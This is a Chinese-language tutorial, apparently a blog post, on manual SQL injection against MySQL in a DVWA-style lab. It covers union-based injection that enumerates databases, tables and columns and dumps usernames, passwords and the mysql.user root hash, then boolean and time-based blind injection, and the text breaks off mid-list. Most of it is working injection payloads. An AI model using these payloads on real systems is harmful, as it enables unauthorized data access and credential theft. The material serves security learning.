+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="type">int</span>整型</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="number">2.</span>sting字符型</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br><span class="line"><span class="number">3.</span><span class="keyword">like</span> 搜索型</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> title <span class="keyword">like</span> <span class="string">&#x27;%标题%&#x27;</span></span><br></pre></td></tr></table></figure>
+<h3 id="常规利用思路"><a href="#常规利用思路" class="headerlink" title="常规利用思路"></a>常规利用思路</h3><ol>
+<li>寻找注入点，可以通过 web 扫描工具实现</li>
+<li>通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息。</li>
+<li>猜解关键数据库表及其重要字段与内容（常见如存放管理员账户的表名、字段名等信息）还可以获取数据库的 root 账号 密码—思路</li>
+<li>可以通过获得的用户信息，寻找后台登录。</li>
+<li>利用后台或了解的进一步信息。</li>
+</ol>
+<h3 id="手注常规思路"><a href="#手注常规思路" class="headerlink" title="手注常规思路"></a>手注常规思路</h3><ol>
+<li>判断是否存在注入，注入是字符型还是数字型</li>
+<li>猜解 SQL 查询语句中的字段数 order by  N</li>
+<li>确定显示的字段顺序</li>
+<li>获取当前数据库</li>
+<li>获取数据库中的表</li>
+<li>获取表中的字段名</li>
+<li>查询到账户的数据</li>
+</ol>
+<h3 id="详细注入过程"><a href="#详细注入过程" class="headerlink" title="详细注入过程"></a>详细注入过程</h3><p>SQL 注入漏洞的产生需要满足以下两个条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">参数用户可控：从前端传给后端的参数内容是用户可以控制的</span><br><span class="line"></span><br><span class="line">参数带入数据库查询：传入的参数拼接到SQL语句，且带入数据库查询</span><br><span class="line"></span><br><span class="line">如果参数id存在注入点</span><br><span class="line">参数的位置可以互换，使用工具的时候要注意</span><br></pre></td></tr></table></figure>
+<h5 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h5><h5 id="猜列数"><a href="#猜列数" class="headerlink" title="猜列数"></a>猜列数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; order by 3 --+</span><br><span class="line">&#x27; order by 4 --+</span><br><span class="line">&#x27; order by 5 --+</span><br></pre></td></tr></table></figure>
+<h5 id="猜数据库"><a href="#猜数据库" class="headerlink" title="猜数据库"></a>猜数据库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2 --+   查看回显点</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select user(),database(),version() --+   查看其他数据</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">union 查询结合了两个 select 查询结果</span><br><span class="line"></span><br><span class="line">根据上面的 order by 语句我们知道查询包含两列</span><br><span class="line"></span><br><span class="line">为了能够现实两列查询结果</span><br><span class="line"></span><br><span class="line">注意参数使用字段中不存在的</span><br><span class="line"></span><br><span class="line">方便全部回显</span><br><span class="line"></span><br><span class="line">-aaa&#x27; union select 1,(select ........) --+</span><br><span class="line"></span><br><span class="line">我们需要用 union 查询结合我们构造的另外一个 select</span><br><span class="line"></span><br><span class="line">注意在使用 union 查询的时候需要和主查询的列数相同</span><br><span class="line"></span><br><span class="line">information_schema.tables：记录所有表名信息的表</span><br><span class="line"></span><br><span class="line">information_schema.columns：记录所有列名信息的表</span><br><span class="line"></span><br><span class="line">table_name：表名</span><br><span class="line"></span><br><span class="line">column_name：列名</span><br><span class="line"></span><br><span class="line">table_schema：数据库名</span><br><span class="line"></span><br><span class="line">user()  查看当前MySQL登录的用户名</span><br><span class="line"></span><br><span class="line">database()   查看当前使用MySQL数据库名</span><br><span class="line"></span><br><span class="line">version()  查看当前MySQL版本</span><br></pre></td></tr></table></figure>
+<h5 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database()) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>group_concat 分组查询</p>
+<p>备注：GROUP_CONCAT函数将分组中的字符串与各种选项进行连接。</p>
+<p>这里介绍几个字符连接函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. concat(str1,str2,...)——没有分隔符地连接字符串</span><br><span class="line"></span><br><span class="line">2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串</span><br><span class="line"></span><br><span class="line">3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</span><br></pre></td></tr></table></figure>
+<p>因为我们查询到的数据不是只有一个，所以需要用连接函数把他们连接成一串才能显示出来</p>
+<h5 id="猜列名"><a href="#猜列名" class="headerlink" title="猜列名"></a>猜列名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name =&#x27;</span>users<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span><span class="string">&#x27;users&#x27;</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<h5 id="猜用户数据"><a href="#猜用户数据" class="headerlink" title="猜用户数据"></a>猜用户数据</h5><p>列举出几种 payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(username,password) from users --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,(select group_concat(username,password) from users) --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select group_concat(username),group_concat(password) from users --+</span></span><br></pre></td></tr></table></figure>
+<h5 id="猜-root-用户"><a href="#猜-root-用户" class="headerlink" title="猜 root 用户"></a>猜 root 用户</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(user,password) from mysql.user --+</span></span><br></pre></td></tr></table></figure>
+<p>得到 root 用户信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br></pre></td></tr></table></figure>
+<h5 id="拓展limit"><a href="#拓展limit" class="headerlink" title="拓展limit"></a>拓展limit</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">limit m,n 从m行开始，到m<span class="operator">+</span>n行结束</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin limit <span class="number">2</span>,<span class="number">1</span> 指的是 从第二行开始，到第三行结束</span><br></pre></td></tr></table></figure>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p><strong>根据注入位置数据类型将sql注入分类</strong></p>
+<p><strong>利用order判断字段数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; order by 3 --+</span><br></pre></td></tr></table></figure>
+<p><strong>利用 union select 联合查询，将id值设置成不成立，即可探测到可利用的字段数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">’ union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p><strong>利用函数database(),user(),version()可以得到所探测数据库的数据库名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
+<p><strong>利用 union select 联合查询，获取表名</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+<p><strong>利用 union select 联合查询，获取字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
+<p><strong>利用 union select 联合查询，获取字段值</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure>
+<h5 id="union-联合注入原理"><a href="#union-联合注入原理" class="headerlink" title="union 联合注入原理"></a>union 联合注入原理</h5><p>联合查询注入是联合两个表进行注入攻击</p>
+<p>使用关键词 union select 对两个表进行联合查询。</p>
+<p>两个表的字段要数要相同，不然会出现报错。</p>
+<p>member表有7个字段</p>
+<p>users 有3个字段</p>
+<p>如果直接联合两个表 因为列数跟第一个表不一样 会导致出错</p>
+<p>整合的联合查询方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM member WHERE id=1 union select 1,2,3,4,5,6,7 from users</span><br></pre></td></tr></table></figure>
+<p>member有个7个字段 users 也需要有三个与之匹配</p>
+<p>这些数字可以替换成字段的名称或者函数。</p>
+<p>替换成函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM member WHERE id=1 union select 1,2,3,4,database(),user(),version() from users</span><br></pre></td></tr></table></figure>
+<p>字段替换成字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM member WHERE id=1 union select 1,2,3,level,id,username,password from users</span><br></pre></td></tr></table></figure>
+<p>如果没有加上 limit 限定条数会把所有内容查询出来，所以都会加上 limit 限定</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM member WHERE id=1 union select 1,2,3,level,id,username,password from users limit 0,1</span><br></pre></td></tr></table></figure>
+<p>但是只会显示第一条，因为 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM member WHERE id=1</span><br></pre></td></tr></table></figure>
+<p>这个语句是存在记录的 </p>
+<p>如果想要 admin的内容可以把1 换成其他不存在的记录，</p>
+<p>因为默认负数就表示不存在的</p>
+<p>所以可以在数字前加上-1 即可显示第二个表的内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM member WHERE id=-1 union select 1,2,3,level,id,username,password from users limit 1,1</span><br></pre></td></tr></table></figure>
+<h3 id="UNION联合注入"><a href="#UNION联合注入" class="headerlink" title="UNION联合注入"></a>UNION联合注入</h3><p>源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; </span><br></pre></td></tr></table></figure>
+<h5 id="判断-SQL-注入"><a href="#判断-SQL-注入" class="headerlink" title="判断 SQL 注入"></a>判断 <strong>SQL</strong> 注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT first_name, last_name FROM </span><br><span class="line">users WHERE user_id = &#x27;1&#x27;and &#x27;1&#x27;=&#x27;1&#x27;;&quot;; </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT first_name, last_name FROM users WHERE </span><br><span class="line">user_id = &#x27;1&#x27;and &#x27;1&#x27;=&#x27;2&#x27;;&quot;; </span><br></pre></td></tr></table></figure>
+<p>输入1’and ‘1’=’1页面返回用户信息和输入 1’and ‘1’=’2 页面返回不一样的信息</p>
+<p>基本可以确定存在 SQL 注入漏洞</p>
+<h5 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h5><p>使用语句 order by 确定当前表的字符数</p>
+<p>order by 1 如果页面返回正常 字段数不少于 1,order by 2 不少于 2，</p>
+<p>一直如此类推直到页面出错。正确的字段数是出错数字减少 1</p>
+<p>公式 order by n-1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1--+ 正常</span><br><span class="line"></span><br><span class="line">1&#x27; order by 2--+ 正常</span><br><span class="line"></span><br><span class="line">1&#x27; order by 3--+ 出错</span><br></pre></td></tr></table></figure>
+<p>最终确定字段数为 2</p>
+<h5 id="联合查询注入获取敏感信息"><a href="#联合查询注入获取敏感信息" class="headerlink" title="联合查询注入获取敏感信息"></a>联合查询注入获取敏感信息</h5><p>联合查询 输入 数字 查询页面是否有数字输出。输出的地方就是显示的内容但是被数字替换了。</p>
+<p>-1 是让前面的表查询的内容不存在。所以就会显示显示数字。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2 --+</span><br></pre></td></tr></table></figure>
+<p>把数据替换成 mysql 的函数例如 md5(1) 这会在页面返回 1 的 md5 加密信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,md5(1) --+</span><br></pre></td></tr></table></figure>
+<p>使用这个函数一般是白帽子扫描器的匹配存在漏洞的特征码。</p>
+<p>接着获取 mysql 版本 当前用户权限 当前数据库</p>
+<p>version() mysql 版本</p>
+<p>database() 当前数据库</p>
+<p>user() 当前用户名</p>
+<p>group_concat()分组打印字符串</p>
+<p>把函数直接替换数字查看页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,version() --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(user(),0x3A,database(),version()) --+</span><br></pre></td></tr></table></figure>
+<p>如果你想一次打印多个敏感信息可以使用 group_concat()把查询的函数写人 里 0x3A 是：这个符号的十六进制 在 mysql 里会自动转成符号：</p>
+<p>知道当前库名是 dvwa</p>
+<h5 id="联合查询注入通过-information-schema-获取表"><a href="#联合查询注入通过-information-schema-获取表" class="headerlink" title="联合查询注入通过 information_schema 获取表"></a>联合查询注入通过 <strong>information_schema</strong> 获取表</h5><p>在黑盒的情况下是不知道当前库有什么表的</p>
+<p>可以通过 mysql 自带的information_schema 查询当前库的表。</p>
+<p>查询当前库的表 limit 1 相当于 limit 1,1 表示显示第一个 1 改成 2 就是第二个</p>
+<p>如此类推</p>
+<p>第一个表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) --+</span><br></pre></td></tr></table></figure>
+<p>第二个表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,2) --+</span><br></pre></td></tr></table></figure>
+<h5 id="联合查询注入通过-information-schema-获取字段"><a href="#联合查询注入通过-information-schema-获取字段" class="headerlink" title="联合查询注入通过 information_schema 获取字段"></a>联合查询注入通过 <strong>information_schema</strong> 获取字段</h5><p>同样的查询字段也可以通过内置库 information_schema 里的 COLUMNS</p>
+<p>这个表记录所有表的字段。通过 COLUMNS 查询 users 表的字段。 </p>
+<p>获取 users 表第一个字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1) --+</span><br></pre></td></tr></table></figure>
+<p>获取 users 表第二个字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 2,1) --+</span><br></pre></td></tr></table></figure>
+<p>获取 users 表第三个字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 3,1) --+</span><br></pre></td></tr></table></figure>
+<h5 id="通过联合查询表里的内容"><a href="#通过联合查询表里的内容" class="headerlink" title="通过联合查询表里的内容"></a>通过联合查询表里的内容</h5><p>通过以上的黑盒查询 获取库名、表名、字段、那么就可以查询某个表的内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select group_concat(user,0x3a,password) from users limit 1) --+</span><br></pre></td></tr></table></figure>
+<h3 id="布尔型盲注入"><a href="#布尔型盲注入" class="headerlink" title="布尔型盲注入"></a>布尔型盲注入</h3><p>这种在页面中不会显示数据库信息，一般情况下只会显示对与错的内容。</p>
+<p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220816095058383.png" alt="image-20220816095058383" style="zoom:80%;" /></p>
+<p>接收 id 的值，直接带入查询</p>
+<p>如果存在即返回 users is exists in the database</p>
+<p>否则显示 users id is missing 像这种只有正确与错误页面。</p>
+<p>页面不会显示数据库里任何内容，如果存在注入，成为盲注入。</p>
+<p>盲注入的方式有两种：一种是布尔型盲注入，另外一种是延时注入。</p>
+<h5 id="判断盲注入"><a href="#判断盲注入" class="headerlink" title="判断盲注入"></a>判断盲注入</h5><p>输入 SQL 注入检测语句 判断页面是否不一样</p>
+<p>如果不一样大概会存在 SQL 注入漏洞 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and &#x27;1&#x27;=&#x27;1 </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and &#x27;1&#x27;=&#x27;2 </span><br></pre></td></tr></table></figure>
+<p>如果输入检测语句页面没有任何改变可以使用延时语句进行检测 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and sleep(10)--+ </span><br></pre></td></tr></table></figure>
+<p>函数 sleep() 在 mysql 是延时返回的意思 以秒为单位 sleep(10) 即延时 10 秒执行。</p>
+<p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220816095900545.png" alt="image-20220816095900545"></p>
+<h5 id="布尔型注入攻击"><a href="#布尔型注入攻击" class="headerlink" title="布尔型注入攻击"></a>布尔型注入攻击</h5><p>布尔型注入攻击，因为页面不会返回任何数据库内容</p>
+<p>所以不能使用联合查询将敏感信息显示在页面</p>
+<p>但是可以通过构造 SQL 语句，获取数据。</p>
+<p>布尔型盲注入用到得 SQL 语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(1=1,1,0)</span><br></pre></td></tr></table></figure>
+<p> if()函数在 mysql 是判断，第一个参数表达式，如果条件成立，会显示 1，否则显示 0</p>
+<p>1=1 表达式可以换成构造的 SQL 攻击语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(1=1,1,0) --+ </span><br></pre></td></tr></table></figure>
+<p>页面返回正常</p>
+<p>这个语句实际上是 1’and 1，真 and 真 结果为真</p>
+<p>1 是存在记录的。所以返回正确页面。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(1=2,1,0) --+ </span><br></pre></td></tr></table></figure>
+<p>页面返回错误，这个语句就是 1’and 0 ，真 and 假 结果为假</p>
+<p>整个 SQL ID 的值也是 0 所以没有记录</p>
+<p>返回错误页面。</p>
+<h5 id="布尔型盲注入获取数据库敏感信息"><a href="#布尔型盲注入获取数据库敏感信息" class="headerlink" title="布尔型盲注入获取数据库敏感信息"></a>布尔型盲注入获取数据库敏感信息</h5><p>在黑盒的环境下，通过构造 SQL 注入语句，根据页面的特征确定获取敏感信息。</p>
+<p>布尔型盲注入用到的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUBSTRING()字符串截取</span><br></pre></td></tr></table></figure>
+<p>第一个参数是一个字符串，第二个参数是从哪里开始截取  第三个是要截取的长度。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select database()查询当前库</span><br></pre></td></tr></table></figure>
+<p>通过 substring 截取截取长度</p>
+<p>举例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substring(‘ename’,2,2)</span><br><span class="line">结果为‘am’。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substring(database(),1,1) </span><br><span class="line">截取database（）数据库名 的第一个字符</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220816100002099.png" alt="image-20220816100002099"></p>
+<p>接着再用 if 函数进行构造 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(substring(database(),1,1)=&#x27;r&#x27;,1,0)</span><br></pre></td></tr></table></figure>
+<p>判断数据库第一个字是不是字符 r，如果是返回 1 否则返回 0 。</p>
+<p>接着判断第二个字符：</p>
+<p>将 substring 第二个参数写成 2 因为要截取第二个字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(sunstring(database(),2,1)=&#x27;o&#x27;,1,0) </span><br></pre></td></tr></table></figure>
+<p>第二个字符为 o。如此类推。再后拼</p>
+<p>接字符就是完整的库名。</p>
+<h5 id="在黑盒模式下布尔型注入"><a href="#在黑盒模式下布尔型注入" class="headerlink" title="在黑盒模式下布尔型注入"></a>在黑盒模式下布尔型注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">在上面详细了说了布尔型盲注入的原理，在黑盒的模式下进行测试。</span><br><span class="line"></span><br><span class="line">首先判断注入</span><br><span class="line"></span><br><span class="line">判断完注入就获取数据库的长度</span><br><span class="line"></span><br><span class="line">得到长度再查询库名</span><br><span class="line"></span><br><span class="line">通过库名再查询表</span><br><span class="line"></span><br><span class="line">接着通过表查询字段</span><br><span class="line"></span><br><span class="line">最后查询某表指定的数据</span><br></pre></td></tr></table></figure>
+<h5 id="布尔型盲注入查询长度"><a href="#布尔型盲注入查询长度" class="headerlink" title="布尔型盲注入查询长度"></a>布尔型盲注入查询长度</h5><p>要查询当前库名，首先确定要查询数据库的长度，再通过截取字符进行对比。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(database())=4,1,0) --+</span><br></pre></td></tr></table></figure>
+<p>判断库名的长度为 4，截取第一个字符再进行判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">A</span><br><span class="line">B</span><br><span class="line">C</span><br><span class="line">D</span><br><span class="line">E</span><br><span class="line">F</span><br><span class="line">G</span><br><span class="line">H</span><br><span class="line">I</span><br><span class="line">J</span><br><span class="line">K</span><br><span class="line">L</span><br><span class="line">M</span><br><span class="line">N</span><br><span class="line">O</span><br><span class="line">P</span><br><span class="line">Q</span><br><span class="line">R</span><br><span class="line">S</span><br><span class="line">T</span><br><span class="line">U</span><br><span class="line">V</span><br><span class="line">W</span><br><span 